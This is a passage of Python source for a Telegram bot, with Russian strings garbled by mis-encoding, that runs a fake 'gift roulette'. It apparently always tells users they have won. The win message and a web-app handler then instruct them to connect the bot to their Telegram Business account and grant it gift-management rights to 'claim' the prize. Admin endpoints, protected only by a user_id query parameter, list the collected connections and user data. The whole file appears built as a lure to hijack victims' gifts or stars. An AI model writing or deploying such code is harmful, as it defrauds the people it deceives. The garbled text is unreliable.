        {'name': '–ó–≤–µ–∑–¥–∞', 'price': 300},
        {'name': '–ö–Ω–∏–≥–∞', 'price': 80},
        {'name': '–ö–æ—Ç–∏–∫', 'price': 150},
        {'name': '–†–æ–±–æ—Ç', 'price': 250},
    ]

def generate_roulette_image(gifts, highlight_index):
    width, height = 600, 120
    img = Image.new("RGB", (width, height), "white")
    draw = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype("arial.ttf", 18)
    except Exception:
        font = ImageFont.load_default()
    sector_w = width // len(gifts)
    for i, gift in enumerate(gifts):
        x = i * sector_w
        color = "yellow" if i == highlight_index else "lightgray"
        draw.rectangle([x, 0, x+sector_w, height], fill=color)
        draw.text((x+10, 40), f"{gift['name']}\n{gift['price']}‚≠ê", fill="black", font=font)
    return img

@dp.message(F.text == "/roulette")
async def start_roulette(message: types.Message):
    gifts = await get_gifts()
    if not gifts:
        await message.answer("–ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è —Ä—É–ª–µ—Ç–∫–∏.")
        return

    roll_sequence = []
    for _ in range(20):
        idx = random.randint(0, len(gifts)-1)
        window = [gifts[(idx+i)%len(gifts)] for i in range(-2, 3)]
        roll_sequence.append((window, 2))
    win_idx = random.randint(0, len(gifts)-1)
    window = [gifts[(win_idx+i)%len(gifts)] for i in range(-2, 3)]
    roll_sequence.append((window, 2))

    msg = await message.answer("–ö—Ä—É—Ç–∏–º —Ä—É–ª–µ—Ç–∫—É...")
    roulette_msg = None
    for i, (window, highlight) in enumerate(roll_sequence):
        img = generate_roulette_image(window, highlight)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        input_file = BufferedInputFile(buf.getvalue(), "roulette.png")
        if i == 0:
            roulette_msg = await message.answer_photo(input_file)
        else:
            if roulette_msg:
                try:
                    await roulette_msg.edit_media(InputMediaPhoto(media=input_file))
                except Exception:
                    pass
        await asyncio.sleep(0.12 + i*0.03)

    win_gift = window[highlight]
    await message.answer(
        f"üéâ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –í—ã –≤—ã–∏–≥—Ä–∞–ª–∏: <b>{win_gift['name']}</b> –∑–∞ <b>{win_gift['price']}‚≠ê</b>.\n\n"
        "–ß—Ç–æ–±—ã –∑–∞–±—Ä–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫, –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –±–æ—Ç–∞ –≤ —Ä–∞–∑–¥–µ–ª –ß–∞—Ç-–±–æ—Ç—ã Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞.",
        parse_mode="HTML"
    )

    webapp_url = "https://my-roulette-app-pi.vercel.app/"  # –∏–ª–∏ –ª–æ–∫–∞–ª—å–Ω—ã–π ngrok, –µ—Å–ª–∏ —Ç–µ—Å—Ç–∏—Ä—É–µ—à—å

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="üé∞ –û—Ç–∫—Ä—ã—Ç—å —Ä—É–ª–µ—Ç–∫—É", web_app=WebAppInfo(url=webapp_url))]
        ],
        resize_keyboard=True
    )

    await message.answer("–ñ–º–∏ –∫–Ω–æ–ø–∫—É –∏ –∫—Ä—É—Ç–∏ —Ä—É–ª–µ—Ç–∫—É!", reply_markup=keyboard)

@dp.message(F.web_app_data)
async def on_webapp_data(message: types.Message):
    if not message.web_app_data:
        return

    data_str = message.web_app_data.data
    try:
        data = json.loads(data_str)
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω—É–∂–Ω–æ –ª–∏ –ø–æ–∫–∞–∑–∞—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é
        if data.get('action') == 'show_connection_instructions':
            instruction_text = (
                "üìå <b>–î–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–¥–∞—Ä–∫–∞, –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É.</b>\n\n"
                "–ö–∞–∫ —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å:\n\n"
                "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram</b>\n"
                "2. üíº –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª <b>Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞</b>\n"
                "3. ü§ñ –û—Ç–∫—Ä–æ–π—Ç–µ –ø—É–Ω–∫—Ç <b>–ß–∞—Ç-–±–æ—Ç—ã</b> –∏ –¥–æ–±–∞–≤—å—Ç–µ —ç—Ç–æ–≥–æ –±–æ—Ç–∞.\n\n"
                "‚ùóÔ∏è–î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç—É —Ç—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –Ω–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–∞–º–∏."
            )
            await message.answer(instruction_text, parse_mode="HTML")
            return

        # –õ–æ–≥–∏–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤—ã–∏–≥—Ä—ã—à–∞ (–æ—Å—Ç–∞–µ—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π)
        prize = data.get('prize', {})
        if prize.get('starPrice', 0) > 0:
            text = f"üéâ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –¢—ã –≤—ã–∏–≥—Ä–∞–ª: {prize.get('name', '–Ω–∏—á–µ–≥–æ')} ({prize.get('starPrice', 0)}‚≠ê)"
        else:
            text = "–í —ç—Ç–æ—Ç —Ä–∞–∑ –Ω–µ –ø–æ–≤–µ–∑–ª–æ, –Ω–æ –ø–æ–ø—Ä–æ–±—É–π –µ—â–µ —Ä–∞–∑!"
        await message.answer(text)

    except json.JSONDecodeError:
        await message.answer("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö.")

@dp.message(Command("giftinfo"))
async def gift_info_command(message: types.Message):
    if not message.text or len(message.text.split()) < 2:
        await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ URL –ø–æ–¥–∞—Ä–∫–∞. –ü—Ä–∏–º–µ—Ä: /giftinfo <url>")
        return

    url = message.text.split()[1]
    data = get_gift_data(url)

    if not data:
        await message.answer("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–¥–∞—Ä–∫–µ.")
        return

    # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –∫—Ä–∞—Å–∏–≤—ã–π –æ—Ç–≤–µ—Ç
    details_text = "\n".join([f" ‚Ä¢ {k.replace('_', ' ').title()}: {v['name']} ({v['rarity']})" for k, v in data.get('details', {}).items() if v['rarity']])
    response_text = (
        f"<b>{data.get('title', '–ë–µ–∑ –Ω–∞–∑–≤–∞–Ω–∏—è')}</b>\n\n"
        f"{details_text}\n\n"
        f"<a href='{data.get('media_url', '')}'>–ú–µ–¥–∏–∞—Ñ–∞–π–ª</a>"
    )
    await message.answer(response_text, parse_mode="HTML")

# --- –ù–æ–≤—ã–µ API —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã –¥–ª—è –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏ ---

@flask_app.route('/api/admin/connections')
def get_admin_connections():
    user_id_str = request.args.get('user_id')
    if not user_id_str or int(user_id_str) != ADMIN_ID:
        abort(403) # –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω
    try:
        connections = load_json_file(CONNECTIONS_FILE)
        return jsonify(connections)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@flask_app.route('/api/admin/user_data')
def get_admin_user_data():
    user_id_str = request.args.get('user_id')
    if not user_id_str or int(user_id_str) != ADMIN_ID:
        abort(403) # –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω
    try:
        user_data = read_user_data()
        return jsonify(user_data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@flask_app.route('/admin')
def admin_page():
    # –û—Ç–¥–∞–µ–º —Å—Ç–∞—Ç–∏—á–Ω—ã–π —Ñ–∞–π–ª admin.html
    return flask_app.send_static_file('admin.html')

# --- –ö–æ–º–∞–Ω–¥—ã –±–æ—Ç–∞ ---

@dp.message(Command("admin"))
async def admin_command(message: types.Message):
    logging.info(f"Admin command received from user {message.from_user.id if message.from_user else 'Unknown'}")
    try:
        if not message.from_user:
            logging.warning("Cannot process /admin command without user info")
            return

        logging.info(f"Comparing user ID {message.from_user.id} with ADMIN_ID {ADMIN_ID}")
        if message.from_user.id != ADMIN_ID:
            logging.info(f"User {message.from_user.id} is not admin. Sending 'no rights' message.")
            return await message.answer("–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")

        logging.info(f"User {message.from_user.id} is admin. Preparing admin panel link.")
        
        if not WEBHOOK_URL:
            logging.error("WEBHOOK_URL is not set! Cannot create admin panel link.")
            return await message.answer("–û—à–∏–±–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ —Å–µ—Ä–≤–µ—Ä–∞: –Ω–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É.")

        admin_url = f"{WEBHOOK_URL}/admin.html"
        logging.info(f"Admin panel URL created: {admin_url}")

        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="üîë –û—Ç–∫—Ä—ã—Ç—å –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å", url=admin_url)]])
        logging.info("Keyboard created. Sending message...")
        
        await message.answer("–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å –¥–æ—Å—Ç—É–ø–Ω–∞ –ø–æ –∫–Ω–æ–ø–∫–µ –Ω–∏–∂–µ:", reply_markup=keyboard)
        logging.info("Admin panel message sent successfully.")

    except Exception as e:
        logging.exception("An error occurred in the admin_command handler!")
        await message.answer("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –≤–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–æ–≥–∏ —Å–µ—Ä–≤–µ—Ä–∞.")

@dp.message(Command("resetwebhook"))
async def reset_webhook(message: Message):
    if not message.from_user or message.from_user.id != ADMIN_ID:
        return

    logging.info("--- Force resetting webhook ---")
    if WEBHOOK_URL:
        await bot.set_webhook(url=f"{WEBHOOK_URL}/webhook", drop_pending_updates=True)
        await message.answer("Webhook –±—ã–ª —Å–±—Ä–æ—à–µ–Ω!")
        logging.info("--- Webhook has been reset ---")
    else:
        await message.answer("–û—à–∏–±–∫–∞: WEBHOOK_URL –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω.")

# --- "–°–∫–ª–µ–∏–≤–∞–µ–º" –¥–≤–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è ---
# FastAPI –±—É–¥–µ—Ç –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å /webhook, –∞ –≤—Å—ë –æ—Å—Ç–∞–ª—å–Ω–æ–µ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –≤ Flask
app.mount("/", WSGIMiddleware(flask_app))

# –≠—Ç–æ—Ç –±–ª–æ–∫ –Ω—É–∂–µ–Ω –¥–ª—è Render, —á—Ç–æ–±—ã gunicorn –º–æ–≥ –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    print("Bot is running locally...")
    dp.run_polling(bot)